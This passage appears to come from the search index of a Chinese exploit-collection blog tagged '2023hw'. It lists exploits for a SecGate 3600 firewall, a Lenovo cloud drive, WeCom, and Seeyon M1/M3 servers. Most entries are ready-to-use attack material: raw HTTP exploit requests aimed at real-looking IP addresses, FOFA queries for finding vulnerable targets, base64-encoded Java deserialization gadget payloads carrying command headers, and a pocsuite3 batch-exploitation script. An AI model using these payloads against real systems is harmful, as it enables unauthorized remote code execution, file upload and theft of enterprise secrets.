文件读取漏洞","uri":"/%E7%BD%91%E7%A5%9Esecgate-3600%E9%98%B2%E7%81%AB%E5%A2%99-sys_export_conf_local_save-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"网神防火墙 app_av_import_save文件上传漏洞 ","date":"2023-12-08","objectID":"/%E7%BD%91%E7%A5%9E%E9%98%B2%E7%81%AB%E5%A2%99-app_av_import_save%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw漏洞"],"title":"网神防火墙 app_av_import_save文件上传漏洞","uri":"/%E7%BD%91%E7%A5%9E%E9%98%B2%E7%81%AB%E5%A2%99-app_av_import_save%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"fofa title=\"网神SecGate 3600防火墙\" ","date":"2023-12-08","objectID":"/%E7%BD%91%E7%A5%9E%E9%98%B2%E7%81%AB%E5%A2%99-app_av_import_save%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:2:0","tags":["2023hw漏洞"],"title":"网神防火墙 app_av_import_save文件上传漏洞","uri":"/%E7%BD%91%E7%A5%9E%E9%98%B2%E7%81%AB%E5%A2%99-app_av_import_save%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"exp POST /?g=app_av_import_save HTTP/1.1 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Language: zh-CN,zh;q=0.9 Connection: close Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryJpMyThWnAxbcBBQc Cache-Control: no-cache Pragma: no-cache Host: 218.60.144.129 Content-Length: 536 ------WebKitFormBoundaryJpMyThWnAxbcBBQc Content-Disposition: form-data; name=\"MAX_FILE_SIZE\" 10000000 ------WebKitFormBoundaryJpMyThWnAxbcBBQc Content-Disposition: form-data; name=\"upfile\"; filename=\"test.txt\" Content-Type: text/plain test111 ------WebKitFormBoundaryJpMyThWnAxbcBBQc Content-Disposition: form-data; name=\"submit_post\" obj_app_upfile ------WebKitFormBoundaryJpMyThWnAxbcBBQc Content-Disposition: form-data; name=\"__hash__\" 0b9d6b1ab7479ab69d9f71b05e0e9445 ------WebKitFormBoundaryJpMyThWnAxbcBBQc-- POST /?g=obj_app_upfile HTTP/1.1 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Language: zh-CN,zh;q=0.9 Connection: close Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryJpMyThWnAxbcBBQc Cache-Control: no-cache Pragma: no-cache Host: 218.60.144.129 Content-Length: 536 ------WebKitFormBoundaryJpMyThWnAxbcBBQc Content-Disposition: form-data; name=\"MAX_FILE_SIZE\" 10000000 ------WebKitFormBoundaryJpMyThWnAxbcBBQc Content-Disposition: form-data; name=\"upfile\"; filename=\"test.txt\" Content-Type: text/plain test111 ------WebKitFormBoundaryJpMyThWnAxbcBBQc Content-Disposition: form-data; name=\"submit_post\" obj_app_upfile ------WebKitFormBoundaryJpMyThWnAxbcBBQc Content-Disposition: form-data; name=\"__hash__\" 0b9d6b1ab7479ab69d9f71b05e0e9445 ------WebKitFormBoundaryJpMyThWnAxbcBBQc-- ","date":"2023-12-08","objectID":"/%E7%BD%91%E7%A5%9E%E9%98%B2%E7%81%AB%E5%A2%99-app_av_import_save%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:3:0","tags":["2023hw漏洞"],"title":"网神防火墙 app_av_import_save文件上传漏洞","uri":"/%E7%BD%91%E7%A5%9E%E9%98%B2%E7%81%AB%E5%A2%99-app_av_import_save%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"漏洞复现 ","date":"2023-12-08","objectID":"/%E7%BD%91%E7%A5%9E%E9%98%B2%E7%81%AB%E5%A2%99-app_av_import_save%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:4:0","tags":["2023hw漏洞"],"title":"网神防火墙 app_av_import_save文件上传漏洞","uri":"/%E7%BD%91%E7%A5%9E%E9%98%B2%E7%81%AB%E5%A2%99-app_av_import_save%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"联想网盘存在任意文件上传漏洞 POST /write?neid=1\u0026hash=../../../../../../../dragonball/srv/tomcat/webapps/stream_server/ttt.txt\u0026status=1 HTTP/1.1 Host:xxxx Cache-Control:max-age=0 Sec-Ch-Ua:\"Chromium\";v=\"117\", \"Not;A=Brand\";v=\"8\" Sec-Ch-Ua-Mobile:?0 Sec-Ch-Ua-Platform:\"Windows\" Upgrade-Insecure-Requests:1 User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36 Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 Sec-Fetch-Site:none Sec-Fetch-Mode:navigate Sec-Fetch-User:?1 Sec-Fetch-Dest:document Accept-Language:zh-CN,zh;q=0.9 Connection:close Content-Type:application/octet-stream Accept-Encoding:gzip, deflate Content-Length:8 Testtest ","date":"2023-12-08","objectID":"/%E8%81%94%E6%83%B3%E7%BD%91%E7%9B%98%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw漏洞"],"title":"联想网盘存在任意文件上传漏洞","uri":"/%E8%81%94%E6%83%B3%E7%BD%91%E7%9B%98%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"# 腾讯 企业微信 agentinfo 信息泄漏漏洞\r","date":"2023-12-08","objectID":"/%E8%85%BE%E8%AE%AF-%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1-agentinfo-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/:0:0","tags":["2023hw"],"title":"腾讯 企业微信 agentinfo 信息泄漏漏洞","uri":"/%E8%85%BE%E8%AE%AF-%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1-agentinfo-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"漏洞描述 腾讯 企业微信 agentinfo 接口存在信息泄漏漏洞，攻击者通过漏洞可以获取企业微信 Secret ","date":"2023-12-08","objectID":"/%E8%85%BE%E8%AE%AF-%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1-agentinfo-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw"],"title":"腾讯 企业微信 agentinfo 信息泄漏漏洞","uri":"/%E8%85%BE%E8%AE%AF-%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1-agentinfo-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"漏洞影响 腾讯 企业微信 ","date":"2023-12-08","objectID":"/%E8%85%BE%E8%AE%AF-%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1-agentinfo-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/:2:0","tags":["2023hw"],"title":"腾讯 企业微信 agentinfo 信息泄漏漏洞","uri":"/%E8%85%BE%E8%AE%AF-%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1-agentinfo-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"网络测绘 web.body=“wework_admin.normal_layout” ","date":"2023-12-08","objectID":"/%E8%85%BE%E8%AE%AF-%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1-agentinfo-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/:3:0","tags":["2023hw"],"title":"腾讯 企业微信 agentinfo 信息泄漏漏洞","uri":"/%E8%85%BE%E8%AE%AF-%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1-agentinfo-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"漏洞复现 登陆页面 验证POC /cgi-bin/gateway/agentinfo ","date":"2023-12-08","objectID":"/%E8%85%BE%E8%AE%AF-%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1-agentinfo-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/:4:0","tags":["2023hw"],"title":"腾讯 企业微信 agentinfo 信息泄漏漏洞","uri":"/%E8%85%BE%E8%AE%AF-%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1-agentinfo-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"## fofa\rtitle==\"M1-Server 已启动\" ","date":"2023-12-08","objectID":"/%E8%87%B4%E8%BF%9C-m1-%E7%A7%BB%E5%8A%A8%E7%AB%AF-usertokenservice-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:0:0","tags":["2023hw"],"title":"致远 M1 移动端 userTokenService 代码执行漏洞","uri":"/%E8%87%B4%E8%BF%9C-m1-%E7%A7%BB%E5%8A%A8%E7%AB%AF-usertokenservice-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"poc POST /esn_mobile_pns/service/userTokenService HTTP/1.1 Host: 112.29.244.165:9999 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15 Cmd: @@@@@whoami Accept-Encoding: gzip Content-Length: 12740  ","date":"2023-12-08","objectID":"/%E8%87%B4%E8%BF%9C-m1-%E7%A7%BB%E5%8A%A8%E7%AB%AF-usertokenservice-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw"],"title":"致远 M1 移动端 userTokenService 代码执行漏洞","uri":"/%E8%87%B4%E8%BF%9C-m1-%E7%A7%BB%E5%8A%A8%E7%AB%AF-usertokenservice-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"gobyexp POST /api/v1/debugExp HTTP/1.1 Content-Type: application/json;charset=UTF-8 Authorization: Basic dXNlcjpwYXNz host: 82.156.29.211:8365 Connection: close Content-Length: 118 {\"hostinfo\":\"http://112.29.244.165:9999\",\"vulfile\":\"CVD-2023-1322.go\",\"expparams\":{\"attackType\":\"cmd\",\"cmd\":\"whoami\"}} ","date":"2023-12-08","objectID":"/%E8%87%B4%E8%BF%9C-m1-%E7%A7%BB%E5%8A%A8%E7%AB%AF-usertokenservice-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:2:0","tags":["2023hw"],"title":"致远 M1 移动端 userTokenService 代码执行漏洞","uri":"/%E8%87%B4%E8%BF%9C-m1-%E7%A7%BB%E5%8A%A8%E7%AB%AF-usertokenservice-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"利用 CB1 生成 hex 反序列化数据，替换 POC 中的 HEX\r然后再 Get 访问/mobile_portal/api/systemLog/pns/loadLog/app.log POST /mobile_portal/api/pns/message/send/batch/6_1sp1 HTTP/1.1 Host: User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Connection: close Cookie: Hm_lvt_82116c626a8d504a5c0675073362ef6f=1666334057 Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: none Sec-Fetch-User: ?1 Content-Type: application/json Content-Length: 3680 [{\"userMessageId\":\"{\\\"@\\u0074\\u0079\\u0070\\u0065\\\":\\\"\\u0063\\u006f\\u006d\\u002e\\u006d\\u0063\\u0068\\u0 061\\u006e\\u0067\\u0065\\u002e\\u0076\\u0032\\u002e\\u0063\\u0033\\u0070\\u0030\\u002e\\u0057\\u0072\\u0061\\u 0070\\u0070\\u0065\\u0072\\u0043\\u006f\\u006e\\u006e\\u0065\\u0063\\u0074\\u0069\\u006f\\u006e\\u0050\\u006f\\u0 06f\\u006c\\u0044\\u0061\\u0074\\u0061\\u0053\\u006f\\u0075\\u0072\\u0063\\u0065\\\",\\\"\\u0075\\u0073\\u0065\\u0072 \\u004f\\u0076\\u0065\\u0072\\u0072\\u0069\\u0064\\u0065\\u0073\\u0041\\u0073\\u0053\\u0074\\u0072\\u0069\\u006e \\u0067\\\":\\\"\\u0048\\u0065\\u0078\\u0041\\u0073\\u0063\\u0069\\u0069\\u0053\\u0065\\u0072\\u0069\\u0061\\u006c\\u 0069\\u007a\\u0065\\u0064\\u004d\\u0061\\u0070:HEX;\\\"}|\",\"channelId\":\"111\",\"title\":\"111\",\"content\":\"222\",\"deviceTyp e\":\"androidphone\",\"serviceProvider\":\"baidu\",\"deviceFirm\":\"other\"}] ","date":"2023-12-08","objectID":"/%E8%87%B4%E8%BF%9C-m3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-mobile_portal-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:0:0","tags":["2023hw"],"title":"致远 M3 反序列化 mobile_portal 远程命令执行漏洞","uri":"/%E8%87%B4%E8%BF%9C-m3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-mobile_portal-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"致远M1 usertokenservice 反序列化RCE漏洞 ","date":"2023-12-08","objectID":"/%E8%87%B4%E8%BF%9Cm1-usertokenservice-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96rce%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw漏洞"],"title":"致远M1 usertokenservice 反序列化RCE漏洞","uri":"/%E8%87%B4%E8%BF%9Cm1-usertokenservice-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96rce%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"fofa \"M1-Server 已启动\" ","date":"2023-12-08","objectID":"/%E8%87%B4%E8%BF%9Cm1-usertokenservice-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96rce%E6%BC%8F%E6%B4%9E/:2:0","tags":["2023hw漏洞"],"title":"致远M1 usertokenservice 反序列化RCE漏洞","uri":"/%E8%87%B4%E8%BF%9Cm1-usertokenservice-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96rce%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"poc POST /esn_mobile_pns/service/userTokenService HTTP/1.1 Host: {{Hostname}} User-Agent: Mozilla/5.0 Content-Type: application/x-www-form-urlencoded cmd: @@@@@echo test {{base64_decode(\"rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLc0AwAAeHB3DAAAAAI/QAAAAAAAAXNyADRvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUuVGllZE1hcEVudHJ5iq3SmznBH9sCAAJMAANrZXl0ABJMamF2YS9sYW5nL09iamVjdDtMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQAA2Zvb3NyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFpbmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9Virx2DQYmQIAAHhwAAAABHNyADtvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRUcmFuc2Zvcm1lclh2kBFBArGUAgABTAAJaUNvbnN0YW50cQB+AAN4cHZyACBqYXZheC5zY3JpcHQuU2NyaXB0RW5naW5lTWFuYWdlcgAAAAAAAAAAAAAAeHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zvcm1lcofo/2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZE5hbWV0ABJMamF2YS9sYW5nL1N0cmluZztbAAtpUGFyYW1UeXBlc3QAEltMamF2YS9sYW5nL0NsYXNzO3hwdXIAE1tMamF2YS5sYW5nLk9iamVjdDuQzlifEHMpbAIAAHhwAAAAAHQAC25ld0luc3RhbmNldXIAEltMamF2YS5sYW5nLkNsYXNzO6sW167LzVqZAgAAeHAAAAAAc3EAfgATdXEAfgAYAAAAAXQAAmpzdAAPZ2V0RW5naW5lQnlOYW1ldXEAfgAbAAAAAXZyABBqYXZhLmxhbmcuU3RyaW5noPCkOHo7s0ICAAB4cHNxAH4AE3VxAH4AGAAAAAF0LWx0cnkgewogIGxvYWQoIm5hc2hvcm46bW96aWxsYV9jb21wYXQuanMiKTsKfSBjYXRjaCAoZSkge30KZnVuY3Rpb24gZ2V0VW5zYWZlKCl7CiAgdmFyIHRoZVVuc2FmZU1ldGhvZCA9IGphdmEubGFuZy5DbGFzcy5mb3JOYW1lKCJzdW4ubWlzYy5VbnNhZmUiKS5nZXREZWNsYXJlZEZpZWxkKCd0aGVVbnNhZmUnKTsKICB0aGVVbnNhZmVNZXRob2Quc2V0QWNjZXNzaWJsZSh0cnVlKTsgCiAgcmV0dXJuIHRoZVVuc2FmZU1ldGhvZC5nZXQobnVsbCk7Cn0KZnVuY3Rpb24gcmVtb3ZlQ2xhc3NDYWNoZShjbGF6eil7CiAgdmFyIHVuc2FmZSA9IGdldFVuc2FmZSgpOwogIHZhciBjbGF6ekFub255bW91c0NsYXNzID0gdW5zYWZlLmRlZmluZUFub255bW91c0NsYXNzKGNsYXp6LGphdmE ","date":"2023-12-08","objectID":"/%E8%87%B4%E8%BF%9Cm1-usertokenservice-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96rce%E6%BC%8F%E6%B4%9E/:3:0","tags":["2023hw漏洞"],"title":"致远M1 usertokenservice 反序列化RCE漏洞","uri":"/%E8%87%B4%E8%BF%9Cm1-usertokenservice-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96rce%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"批量检测脚本 #!/usr/bin/env python # coding: utf-8 from pocsuite3.api import ( POCBase, Output, register_poc, logger, requests, OptDict, OptString, VUL_TYPE, REVERSE_PAYLOAD, POC_CATEGORY ) class POC(POCBase): vulID = '1' version = '1' author = ['AuthorName'] vulDate = '2023-08-15' createDate = '2023-08-15' updateDate = '2023-08-15' references = [''] name = 'POC Name' appPowerLink = '' appName = 'Application Name' appVersion = '' vulType = VUL_TYPE.COMMAND_EXECUTION desc = ''' Description of the vulnerability. ''' samples = [''] install_requires = [''] pocDesc = ''' How to use the POC. ''' category = POC_CATEGORY.EXPLOITS.REMOTE def _verify(self): result = {} path = '/esn_mobile_pns/service/userTokenService' headers = { \"User-Agent\": \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36\", 'Connection': 'close', 'Content-Type': 'application/x-www-form-urlencoded', 'Accept-Encoding': 'gzip, deflate', 'cmd': '@@@@@echo Test', } data = '''{{base64dec(rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLc0AwAAeHB3DAAAAAI/QAAAAAAAAXNyADRvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUuVGllZE1hcEVudHJ5iq3SmznBH9sCAAJMAANrZXl0ABJMamF2YS9sYW5nL09iamVjdDtMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQAA2Zvb3NyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFpbmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9Virx2DQYmQIAAHhwAAAABHNyADtvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRUcmFuc2Zvcm1lclh2kBFBArGUAgABTAAJaUNvbnN0YW50cQB+AAN4cHZyACBqYXZheC5zY3JpcHQuU2NyaXB0RW5naW5lTWFuYWdlcgAAAAAAAAAAAAAAeHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zvcm1lcofo/2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldG hvZHQAEkxqYXZhL2xhbmcvU3RyaW5nO1sAC2lNZXRob2RxAH4ACnhyACBqYXZheC5zY3JpcHQuU2NyaXB0RW5naW5lTWFuYWdlcgAAAAAAAAAACnQAGVJGOkpNb2RlbFJlc3VsdHQAG0xqYXZhL2xhbmcvU3RyaW5nO3hwc3EAfgAKc3IAJm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5rZXl2YWx1ZS5UaWVkTWFwRW50cnlUiqsSmzlVCAIAAUwAA21hcHQAQkxqYXZhL2xhbmcvT2JqZWN0O3hwc3IAFGphdmEubGFuZy5PYmplY3QAAAAAAAAAAAAAAHhwc3EAfgAJeHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkNvbnN0YW50VHJhbnNmb3JtZXJUcmFuc2Zvcm1lcrN5Y+2Zs1QDAAB4cHcEAAAAAHg= ''' response = requests.post(self.url + path, headers=headers, data=data) if response.status_code == 200 and \"Test\" in response.text: result['VerifyInfo'] = {} result['VerifyInfo']['URL'] = self.url + path result['VerifyInfo']['Payload'] = headers['cmd'] return self.parse_output(result) def _attack(self): return self._verify() def _parse_output(self, output): parsed_output = Output(self) if output: parsed_output.success(output) else: parsed_output.fail(\"Exploit failed. Target is not vulnerable.\") return parsed_output register_poc(POC) ","date":"2023-12-08","objectID":"/%E8%87%B4%E8%BF%9Cm1-usertokenservice-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96rce%E6%BC%8F%E6%B4%9E/:4:0","tags":["2023hw漏洞"],"title":"致远M1 usertokenservice 反序列化RCE漏洞","uri":"/%E8%87%B4%E8%BF%9Cm1-usertokenservice-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96rce%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"# 致远OA M1Server userTokenService 远程命令执行漏洞\r","date":"2023-12-08","objectID":"/%E8%87%B4%E8%BF%9Coa-m1server-usertokenservice-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:0:0","tags":["2023hw"],"title":"致远OA M1Server userTokenService 远程命令执行漏洞","uri":"/%E8%87%B4%E8%BF%9Coa-m1server-usertokenservice-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"漏洞描述 致远OA M1Server userTokenService 接口存在远程命令执行漏洞，攻击者通过漏洞可以获取服务器权限 ","date":"2023-12-08","objectID":"/%E8%87%B4%E8%BF%9Coa-m1server-usertokenservice-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw"],"title":"致远OA M1Server userTokenService 远程命令执行漏洞","uri":"/%E8%87%B4%E8%BF%9Coa-m1server-usertokenservice-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"漏洞影响 致远OA M1Server ","date":"2023-12-08","objectID":"/%E8%87%B4%E8%BF%9Coa-m1server-usertokenservice-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:2:0","tags":["2023hw"],"title":"致远OA M1Server userTokenService 远程命令执行漏洞","uri":"/%E8%87%B4%E8%BF%9Coa-m1server-usertokenservice-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"网络测绘 “M1-Server 已启动” ","date":"2023-12-08","objectID":"/%E8%87%B4%E8%BF%9Coa-m1server-usertokenservice-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:3:0","tags":["2023hw"],"title":"致远OA M1Server userTokenService 远程命令执行漏洞","uri":"/%E8%87%B4%E8%BF%9Coa-m1server-usertokenservice-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"漏洞复现 主页面 验证POC POST /esn_mobile_pns/service/userTokenService HTTP/1.1 Host: User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15 Content-Length: 804 Content-Type: application/x-www-form-urlencoded Accept-Encoding: gzip, deflate Connection: close cmd: @@@@@echo Test 